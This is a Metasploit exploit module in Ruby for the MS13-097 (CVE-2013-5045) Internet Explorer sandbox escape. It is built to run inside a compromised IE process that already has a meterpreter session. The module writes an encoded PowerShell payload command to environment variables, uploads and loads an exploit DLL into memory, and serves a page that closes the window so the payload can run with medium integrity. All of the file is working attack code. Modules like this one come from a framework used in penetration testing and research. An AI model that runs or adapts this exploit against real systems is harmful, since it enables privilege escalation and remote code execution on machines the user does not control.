##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'           => 'MS13-097 Registry Symlink IE Sandbox Escape',
      'Description'	   => %q{
        This module exploits a vulnerability in Internet Explorer Sandbox which allows to
        escape the Enhanced Protected Mode and execute code with Medium Integrity. The
        vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll
        component, which can be abused to force medium integrity IE to user influenced keys.
        By using registry symlinks it's possible force IE to add a policy entry in the registry
        and finally bypass Enhanced Protected Mode.
      },
      'License'	       => MSF_LICENSE,
      'Author'	       =>
        [
          'James Forshaw', # Vulnerability Discovery and original exploit code
          'juan vazquez' # metasploit module
        ],
      'Platform'	     => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ],
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Targets'	       =>
        [
          [ 'IE 8 - 11', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => "Dec 10 2013",
      'References'     =>
        [
          ['CVE', '2013-5045'],
          ['MSB', 'MS13-097'],
          ['BID', '64115'],
          ['URL', 'https://github.com/tyranid/IE11SandboxEscapes']
        ]
    ))

    register_options(
      [
        OptInt.new('DELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10])
      ])
  end

  def exploit
    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?

    mod_handle = session.railgun.kernel32.GetModuleHandleA('iexplore.exe')
    if mod_handle['return'] == 0
      fail_with(Failure::NotVulnerable, "Not running inside an Internet Explorer process")
    end

    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NotVulnerable, "Not running at Low Integrity")
    end

    begin
      Timeout.timeout(datastore['DELAY']) { super }
    rescue Timeout::Error
    end

    session.railgun.kernel32.SetEnvironmentVariableA("PSH_CMD", nil)
    session.railgun.kernel32.SetEnvironmentVariableA("HTML_URL", nil)
  end

  def primer
    cmd = cmd_psh_payload(payload.encoded).gsub('%COMSPEC% /B /C start powershell.exe ','').strip
    session.railgun.kernel32.SetEnvironmentVariableA("PSH_CMD", cmd)

    html_uri = "#{get_uri}/#{rand_text_alpha(4 + rand(4))}.html"
    session.railgun.kernel32.SetEnvironmentVariableA("HTML_URL", html_uri)

    temp = get_env('TEMP')

    print_status("Loading Exploit Library...")

    session.core.load_library(
      'LibraryFilePath' => ::File.join(Msf::Config.data_directory, "exploits", "CVE-2013-5045", "CVE-2013-5045.dll"),
      'TargetFilePath'  => temp +  "\\CVE-2013-5045.dll",
      'UploadLibrary'   => true,
      'Extension'       => false,
      'SaveToDisk'      => false
    )
  end

  def on_request_uri(cli, request)
    if request.uri =~ /\.html$/
      print_status("Sending window close html...")
      close_html = <<-eos
<html>
<body>
<script>
window.open('', '_self', '');
window.close();
</script>
</body>
</html>
      eos
      send_response(cli, close_html, { 'Content-Type' => 'text/html' })
    else
      send_not_found(cli)
    end
  end

end
